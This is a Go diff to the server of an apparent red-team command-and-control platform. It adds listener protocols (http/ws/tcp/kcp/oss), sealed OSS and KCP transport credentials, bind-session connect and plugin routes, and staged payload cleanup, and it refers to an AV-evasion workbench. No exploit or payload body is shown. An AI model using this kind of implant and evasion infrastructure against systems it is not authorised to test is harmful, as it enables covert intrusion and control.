@@ -78,8 +78,14 @@ func (s *Server) registerC2Routes(mux *http.ServeMux) {
 	mux.HandleFunc("DELETE /api/c2/payloads/{id}", s.deleteC2Payload)
 	mux.HandleFunc("GET /api/c2/payloads/{id}/download", s.c2PayloadDownload)
 
+	// ---- 三期:正向连接(bind,§18;Agent T)----
+	mux.HandleFunc("POST /api/c2/sessions/connect", s.c2ConnectSession)
+
 	// ---- 二期:免杀工作台/作业/loot→finding(Agent B,c2_evasion.go;签名冻结)----
 	s.registerC2EvasionRoutes(mux)
+
+	// ---- 三期:插件板块(Agent G,c2_plugin.go;契约 §17 钉死的一行接线)----
+	s.registerC2PluginRoutes(mux)
 }
 
 // ---- 公共小件 ----
@@ -288,6 +294,9 @@ func (s *Server) listC2Listeners(w http.ResponseWriter, r *http.Request) {
 // c2ListenerPayload 是建/编监听器的请求体(同 POST 字段;密钥由服务端生成,不收)。
 // 二期载体字段(契约 §12):host_kind 空串=local;vps 时 vps_machine_id/remote_port
 // 必填且 callback 可空(前端用机器 host 拼)。
+// 三期(§18):proto 空=http;transport_config 是 oss/kcp 的传输配置明文
+// (endpoint/bucket/access_key/secret_key/prefix/kcp 另有 psk)——服务端密封入库,
+// 响应永不回显(只回 transport_configured 布尔)。
 type c2ListenerPayload struct {
 	Name     string `json:"name"`
 	BindHost string `json:"bind_host"`
@@ -299,6 +308,68 @@ type c2ListenerPayload struct {
 	HostKind     string `json:"host_kind"`
 	VPSMachineID int64  `json:"vps_machine_id"`
 	RemotePort   int    `json:"remote_port"`
+	// 三期(§18)。
+	Proto           string         `json:"proto"`
+	TransportConfig map[string]any `json:"transport_config"`
+}
+
+// c2SealTransportConfig 校验并密封传输配置明文(§18)。proto=oss 时四要素必填;
+// kcp 只用 psk(可空)。ok=false 表示已写响应(校验失败);sealed=nil 表示「本次不写配置」。
+func c2SealTransportConfig(s *Server, w http.ResponseWriter, proto string, cfg map[string]any) (sealed []byte, ok bool) {
+	if len(cfg) == 0 {
+		if proto == pgdb.C2ProtoOSS {
+			writeErr(w, 400, "oss 监听器必须提供 transport_config(endpoint/bucket/access_key/secret_key)")
+			return nil, false
+		}
+		return nil, true
+	}
+	if proto == pgdb.C2ProtoOSS {
+		for _, k := range []string{"endpoint", "bucket", "access_key", "secret_key"} {
+			if v, _ := cfg[k].(string); strings.TrimSpace(v) == "" {
+				writeErr(w, 400, "oss 传输配置缺少必填键: "+k)
+				return nil, false
+			}
+		}
+	}
+	plain, err := json.Marshal(cfg)
+	if err != nil {
+		writeErr(w, 400, "transport_config 非法: "+err.Error())
+		return nil, false
+	}
+	sealed, err = s.sealC2Secret(plain)
+	if err != nil {
+		writeErr(w, 500, "密封传输配置失败: "+err.Error())
+		return nil, false
+	}
+	return sealed, true
+}
+
+// c2MergeTransportConfig 编辑路径的传输配置字段级合并(集成对齐口径:前端编辑
+// 已配置的监听器只提交非空字段,空/缺失键保留原值)。返回合并后的新密封 JSON。
+func (s *Server) c2MergeTransportConfig(listenerID int64, incoming map[string]any) ([]byte, error) {
+	merged := map[string]any{}
+	if sealed, err := s.m.PG().GetC2ListenerTransportConfig(listenerID); err != nil {
+		return nil, err
+	} else if sealed != nil {
+		plain, oerr := s.openC2Secret(sealed)
+		if oerr != nil {
+			return nil, oerr
+		}
+		_ = json.Unmarshal(plain, &merged)
+	}
+	for k, v := range incoming {
+		if sv, ok := v.(string); ok {
+			if strings.TrimSpace(sv) == "" {
+				continue // 空串 = 保留原值
+			}
+		}
+		merged[k] = v
+	}
+	plain, err := json.Marshal(merged)
+	if err != nil {
+		return nil, err
+	}
+	return s.sealC2Secret(plain)
 }
 
 // c2NormalizeCarrier 校验并补齐载体三元组(host_kind/machine/remote_port);返回
@@ -384,16 +455,29 @@ func (s *Server) createC2Listener(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 400, err.Error())
 		return
 	}
+	proto := strings.TrimSpace(p.Proto)
+	if proto == "" {
+		proto = pgdb.C2ProtoHTTP
+	}
+	if !pgdb.ValidC2ListenerProto(proto) {
+		writeErr(w, 400, fmt.Sprintf("无效协议: %q(仅 http/ws/tcp/kcp/oss)", p.Proto))
+		return
+	}
+	cfgSealed, ok := c2SealTransportConfig(s, w, proto, p.TransportConfig)
+	if !ok {
+		return // 校验失败,响应已写
+	}
 	id, err := s.m.PG().CreateC2Listener(pgdb.C2ListenerInput{
 		Name: p.Name, BindHost: p.BindHost, Port: p.Port,
 		URLPath: urlPath, Callback: p.Callback, EncKeySealed: sealed, Notes: p.Notes,
 		HostKind: hostKind, VPSMachineID: machineID, RemotePort: remotePort,
+		Proto: proto, TransportConfigEnc: cfgSealed,
 	})
 	if err != nil {
 		writeErr(w, 400, err.Error())
 		return
 	}
-	log.Printf("[c2-center] 监听器 «%s»(#%d) 已创建(url_path=%s,载体=%s)", p.Name, id, urlPath, hostKind)
+	log.Printf("[c2-center] 监听器 «%s»(#%d) 已创建(协议=%s,url_path=%s,载体=%s)", p.Name, id, proto, urlPath, hostKind)
 	writeJSON(w, 201, map[string]any{"id": id})
 }
 
@@ -480,8 +564,30 @@ func (s *Server) updateC2Listener(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	carrierChanged := hostKind != existing.HostKind || machineID != existing.VPSMachineID || remotePort != existing.RemotePort
-	if (port != existing.Port || urlPath != existing.URLPath || carrierChanged) && s.c2ListenerRunning(id) {
-		writeErr(w, 409, "监听器运行中,请先停止再修改端口/信道路径/载体")
+	// 协议(§18):空 = 保持原值;改协议属「改端口/路径」级变更,运行中先停。
+	proto := strings.TrimSpace(p.Proto)
+	protoChanged := false
+	if proto != "" {
+		if !pgdb.ValidC2ListenerProto(proto) {
+			writeErr(w, 400, fmt.Sprintf("无效协议: %q(仅 http/ws/tcp/kcp/oss)", p.Proto))
+			return
+		}
+		protoChanged = proto != existing.Proto
+	} else {
+		proto = existing.Proto
+	}
+	// 传输配置(§18,集成对齐口径):未提供 = 不动;提供 = 字段级合并
+	//(新 JSON 的非空键覆盖旧值,空/缺失键保留旧值;密文永不回显所以走合并)。
+	var cfgSealed []byte
+	if len(p.TransportConfig) > 0 {
+		cfgSealed, err = s.c2MergeTransportConfig(id, p.TransportConfig)
+		if err != nil {
+			writeErr(w, 500, "合并传输配置失败: "+err.Error())
+			return
+		}
+	}
+	if (port != existing.Port || urlPath != existing.URLPath || carrierChanged || protoChanged) && s.c2ListenerRunning(id) {
+		writeErr(w, 409, "监听器运行中,请先停止再修改端口/信道路径/协议/载体")
 		return
 	}
 	name := p.Name
@@ -496,6 +602,7 @@ func (s *Server) updateC2Listener(w http.ResponseWriter, r *http.Request) {
 		Name: name, BindHost: bindHost, Port: port,
 		URLPath: urlPath, Callback: p.Callback, Notes: p.Notes,
 		HostKind: hostKind, VPSMachineID: machineID, RemotePort: remotePort,
+		Proto: proto, TransportConfigEnc: cfgSealed,
 	}); uerr != nil {
 		writeErr(w, 400, uerr.Error())
 		return
@@ -1303,7 +1410,8 @@ func (s *Server) listC2Payloads(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	listenerID, _ := strconv.ParseInt(r.URL.Query().Get("listener_id"), 10, 64)
-	items, err := s.m.PG().ListC2Payloads(listenerID)
+	// 三期:走 V3 取列,带出 artifact/direction/staged 到前端(契约 §23 集成项)。
+	items, err := s.m.PG().ListC2PayloadsV3(listenerID)
 	if err != nil {
 		writeErr(w, 500, err.Error())
 		return
@@ -1311,76 +1419,11 @@ func (s *Server) listC2Payloads(w http.ResponseWriter, r *http.Request) {
 	writeJSON(w, 200, map[string]any{"payloads": nonNilPtrSlice(items), "total": len(items)})
 }
 
-// createC2Payload POST /api/c2/payloads — {listener_id,format,target,name} → 201
-// {id,oneliner}。callback 为空 → 400(先填回调地址;载荷内容内嵌 callback,没它就是
-// 废纸)。vps 载体监听器(§12)的 callback 可空:按机器 host+remote_port 现拼。
-// 二期(§14):gosrc + 可选 build_vps_machine_id → 额外建 c2_jobs(kind=build)
-// 并异步经 VPS 编译 → 202 {id,job_id};不给保持一期行为(只出源码 zip)。
-func (s *Server) createC2Payload(w http.ResponseWriter, r *http.Request) {
-	if !s.c2Ready(w) {
-		return
-	}
-	var req struct {
-		ListenerID int64  `json:"listener_id"`
-		Format     string `json:"format"`
-		Target     string `json:"target"`
-		Name       string `json:"name"`
-		// 二期 §14:指定则 gosrc 源码包额外经该机器编译出二进制。
-		BuildVPSMachineID int64 `json:"build_vps_machine_id"`
-	}
-	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 1<<20)).Decode(&req); err != nil {
-		writeErr(w, 400, "invalid JSON: "+err.Error())
-		return
-	}
-	if req.ListenerID <= 0 {
-		writeErr(w, 400, "listener_id 必填")
-		return
-	}
-	buildOnVPS := req.BuildVPSMachineID > 0
-	if buildOnVPS {
-		if req.Format != "" && req.Format != pgdb.C2PayloadFormatGoSrc {
-			writeErr(w, 400, "build_vps_machine_id 仅支持 format=gosrc")
-			return
-		}
-		req.Format = pgdb.C2PayloadFormatGoSrc
-		vm, err := s.m.PG().GetVpsMachine(req.BuildVPSMachineID)
-		if err != nil {
-			writeErr(w, 500, err.Error())
-			return
-		}
-		if vm == nil {
-			writeErr(w, 400, fmt.Sprintf("构建机器 #%d 不存在", req.BuildVPSMachineID))
-			return
-		}
-	}
-	pl, _, err := s.c2GeneratePayload(req.ListenerID, req.Format, req.Target, req.Name, "user")
-	if err != nil {
-		writeErr(w, 400, err.Error())
-		return
-	}
-	if !buildOnVPS {
-		log.Printf("[c2-center] 载荷 «%s»(#%d) 已生成(%s/%s)", pl.Name, pl.ID, pl.Format, pl.Target)
-		writeJSON(w, 201, map[string]any{"id": pl.ID, "oneliner": pl.Oneliner})
-		return
-	}
-	// 建构建作业并异步执行(c2_jobs 由 db/c2_evasion.go 提供,Agent B;kind=build)。
-	input, _ := json.Marshal(map[string]any{"payload_id": pl.ID, "source": "api"})
-	jobID, jerr := s.m.PG().CreateC2Job(pgdb.C2JobInput{
-		Kind:         pgdb.C2JobKindBuild,
-		PayloadID:    pl.ID,
-		ListenerID:   pl.ListenerID,
-		VPSMachineID: req.BuildVPSMachineID,
-		Input:        input,
-	})
-	if jerr != nil {
-		writeErr(w, 500, "载荷已生成但创建构建作业失败: "+jerr.Error())
-		return
-	}
-	go s.runC2BuildJob(jobID) // 事件驱动(仿免杀 runner);崩溃遗留由 initC2Build 恢复
-	log.Printf("[c2-center] 载荷 «%s»(#%d) 已生成(%s/%s),VPS 构建作业 #%d 已排队",
-		pl.Name, pl.ID, pl.Format, pl.Target, jobID)
-	writeJSON(w, 202, map[string]any{"id": pl.ID, "job_id": jobID, "oneliner": pl.Oneliner})
-}
+// createC2Payload(POST /api/c2/payloads)已迁至 server/c2_payload_api.go 并扩展为
+// 三期载荷矩阵版本(契约 C2_CONTRACTS.md §19,Agent P):入参增加 artifact/direction/
+// staged/bind_port,组合校验 + script 同步路径 + 编译型产物 build 作业。路由注册
+// (POST /api/c2/payloads → s.createC2Payload)与 handler 名保持不变,本文件其余
+// 载荷路由(list/download/delete)不动。
 
 // c2GeneratePayload 载荷生成共用核心(API 与 agent 工具同走一条路):
 // 校验 callback 非空 → 解封 key → RenderPayload 渲染字节 → 按 token 算 oneliner →
@@ -1438,14 +1481,30 @@ func (s *Server) c2GeneratePayload(listenerID int64, format, target, name, creat
 	// 渲染载荷字节(RenderPayload:返回 <listenerID>.ps1 风格文件名、脚本字节、
 	// 带占位 token 的一行命令;oneliner/deliver_url 用 c2center.Oneliner/
 	// DeliveryURL 注入真实 token,口径与 beacon 端一致)。
+	// 三期(§18):oss/kcp 载荷要内嵌传输配置(oss 全量 / kcp 仅 psk)——解封后
+	// 以明文 JSON 注入 Listener.TransportConfigJSON(json:"-",只进模板渲染)。
 	l2 := c2centerListenerFromDB(l)
+	if cfgSealed, cerr := pg.GetC2ListenerTransportConfig(listenerID); cerr != nil {
+		return nil, "", cerr
+	} else if cfgSealed != nil {
+		cfgPlain, oerr := s.openC2Secret(cfgSealed)
+		if oerr != nil {
+			return nil, "", fmt.Errorf("解封监听器传输配置失败: %w", oerr)
+		}
+		l2.TransportConfigJSON = string(cfgPlain)
+	}
 	filename, data, _, err := c2center.RenderPayload(format, target, l2, key)
 	if err != nil {
 		return nil, "", fmt.Errorf("渲染载荷失败: %w", err)
 	}
 	token := c2RandomHex(16) // 32 hex 字符投递令牌
 	oneliner := c2center.Oneliner(format, l2, token)
-	deliverURL := c2center.DeliveryURL(l2, token)
+	// 投递 URL 只在 http/ws 载体上有意义(平台同端口托管 /p/<token>);tcp/kcp/oss
+	// 无投递端点,置空(操作者自行投递脚本文本)。
+	deliverURL := ""
+	if l2.Proto == "" || l2.Proto == pgdb.C2ProtoHTTP || l2.Proto == pgdb.C2ProtoWS {
+		deliverURL = c2center.DeliveryURL(l2, token)
+	}
 	sum := sha256Hex(data)
 	if strings.TrimSpace(name) == "" {
 		name = fmt.Sprintf("%s-%s-%s", l.Name, format, target)
@@ -1511,6 +1570,14 @@ func (s *Server) deleteC2Payload(w http.ResponseWriter, r *http.Request) {
 	if pl.FilePath != "" && c2PathUnder(pl.FilePath, c2BlobDir(base, "payloads")) {
 		if err := os.Remove(pl.FilePath); err != nil && !os.IsNotExist(err) {
 			log.Printf("[c2-center] 载荷 #%d 文件清理失败: %v", id, err)
+		}
+	}
+	// 三期 §19:staged 构建的 stage blob 一并清理(命名见 c2_build.go,刻意避开
+	// readPayloadFile 的 <id>_ 匹配,故这里按前缀显式删)。
+	for _, suffix := range []string{".bin", "_src.zip"} {
+		stagePath := filepath.Join(c2BlobDir(base, "payloads"), fmt.Sprintf("stage_%d%s", id, suffix))
+		if err := os.Remove(stagePath); err != nil && !os.IsNotExist(err) {
+			log.Printf("[c2-center] 载荷 #%d stage 产物清理失败: %v", id, err)
 		}
 	}
 	writeJSON(w, 200, map[string]any{"deleted": deleted})
